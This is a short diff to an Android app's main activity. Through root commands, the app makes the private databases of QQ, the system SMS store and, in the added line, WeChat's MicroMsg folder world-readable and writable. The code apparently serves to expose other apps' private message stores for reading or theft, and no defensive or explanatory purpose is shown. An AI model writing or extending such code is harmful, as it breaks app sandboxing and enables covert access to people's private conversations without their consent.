@@ -26,6 +26,7 @@ public class MainActivity extends Activity {
 		String apkRoot="chmod 777 "+getPackageCodePath();
         SystemManager.RootCommand(apkRoot);
         SystemManager.runRootCommand("chmod 777 /data/data/com.tencent.mobileqq/databases/*");
+        SystemManager.runRootCommand("chmod -R 777 /data/data/com.tencent.mm/MicroMsg/");
         SystemManager.runRootCommand("chmod 777 /data/data/com.android.providers.telephony/databases/mmssms.db");
         SystemManager.runRootCommand("chmod 777 /data/data/com.android.providers.telephony/databases/mmssms.db-wal");
         SystemManager.runRootCommand("chmod 777 /data/data/com.android.providers.telephony/databases/mmssms.db-shm");
